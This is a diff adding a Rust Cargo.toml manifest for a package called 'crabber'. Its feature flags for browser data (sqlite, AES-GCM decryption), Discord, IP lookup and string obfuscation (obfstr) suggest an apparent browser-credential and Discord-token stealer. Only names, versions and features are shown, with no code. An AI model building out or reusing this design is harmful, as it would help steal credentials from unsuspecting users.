@@ -1,0 +1,26 @@
+[package]
+name = "crabber"
+version = "0.1.0"
+edition = "2021"
+
+[features]
+default = ["system", "browser"]
+all = ["system", "browser", "discord", "ip"]
+
+system = []
+browser = ["sqlite", "browser-util"]
+browser-util = ["regex", "aes-gcm", "base64_light"]
+discord = ["browser-util", "reqwest", "serde", "regex", "bitflags"]
+ip = ["reqwest", "serde"]
+
+[dependencies]
+anyhow = "1.0.71"
+obfstr = "0.4.3"
+
+reqwest = { version = "0.11.18", default-features = false, features = ["default-tls", "json"], optional = true }
+aes-gcm = { version = "0.10.2", default-features = false, features = ["std", "aes"], optional = true }
+serde = { version = "1.0.166", default-features = false, features = ["derive"], optional = true }
+regex = { version = "1.8.4", default-features = false, features = ["std"], optional = true }
+base64_light = { version = "0.1.5", optional = true }
+bitflags = { version = "2.3.3", optional = true }
+sqlite = { version = "0.31.0", optional = true }
